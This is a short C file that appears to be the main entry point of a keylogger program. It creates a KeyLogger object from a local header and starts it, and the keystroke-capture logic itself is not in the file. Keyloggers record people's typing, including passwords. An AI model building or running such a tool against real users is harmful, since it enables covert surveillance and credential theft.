#include <stdio.h>
#include <stdlib.h>
#include "../includes/keyLogger.h"

int main()
{
  KeyLogger *keyLogger = CreateKeyLogger();

  if (keyLogger == NULL)
  {
    return 1;
  }

  StartKeyLogger(keyLogger);
  return 0;
}
